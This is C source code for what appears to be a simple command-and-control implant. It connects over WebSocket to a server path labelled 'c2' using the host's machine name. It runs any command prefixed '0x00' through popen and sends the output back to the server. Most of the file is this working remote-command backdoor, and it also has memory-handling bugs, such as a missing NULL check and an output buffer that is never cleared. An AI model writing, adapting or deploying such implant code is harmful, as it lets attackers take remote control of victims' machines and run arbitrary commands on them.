#include <stdio.h>
#include <string.h>
#include <sys/utsname.h>

#include "mongoose/mongoose.h"

char global_output[4096];

const char *
get_machine_name()
{
   static struct utsname u;
   if (uname(&u) < 0) {
      return "unknown";
   }
   return u.nodename;
}

char *
run_command(const char *command)
{
    char buffer[2048];
    char *output = NULL;
    size_t output_size = 0;
    FILE *pipe = popen(command, "r");

    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        size_t len = strlen(buffer);
        char *new_output = realloc(output, output_size + len + 1);
        output = new_output;
        memcpy(output + output_size, buffer, len + 1);
        output_size += len;
    }

    pclose(pipe);
    return output;
}

bool
prefix(const char *pre, const char *str)
{
    return strncmp(pre, str, strlen(pre)) == 0;
}

int
tasking(int data_size, const char *data)
{
    printf("%.*s\n", data_size, data);

    if (prefix("0x00", data) == true) {
        data += 5;
        char *o = run_command(data);
        memcpy(global_output, o, strlen(o));
        //printf("%s\n", global_output);
    } else if (prefix("0x01", data) == true) {
        printf("Do something else here...\n");
    }

    return 0;
}

static void
event_handler(struct mg_connection *conn, int event, void *event_data, void *fn_data)
{
    switch (event) {
        case MG_EV_POLL: {
            int n = strlen(global_output);
            if (n != 0) {
                mg_ws_send(conn, global_output, n, WEBSOCKET_OP_TEXT);
            }
            //memset(global_output, 0, 4096);
            //global_output[0] = '\0';
            break;
        }
        case MG_EV_WS_MSG: {
            struct mg_ws_message *wm = (struct mg_ws_message *) event_data;
            if (wm->data.len != 0) {
                tasking(wm->data.len, (char *) wm->data.ptr);
            }
            break;
        }
    }
}

int
main()
{
    struct mg_mgr mgr;
    struct mg_connection *conn;
    bool done = false;

    char url[128];
    snprintf(url, 128, "ws://127.0.0.1:1337/c2/%s", get_machine_name());

    mg_mgr_init(&mgr);

    conn = mg_ws_connect(&mgr, url, event_handler, &done, NULL);
    if (conn == NULL) {
        fprintf(stderr, "Invalid address\n");
        return 1;
    }

    while (conn && done == false) mg_mgr_poll(&mgr, 100);
    mg_mgr_free(&mgr);

    return 0;
}
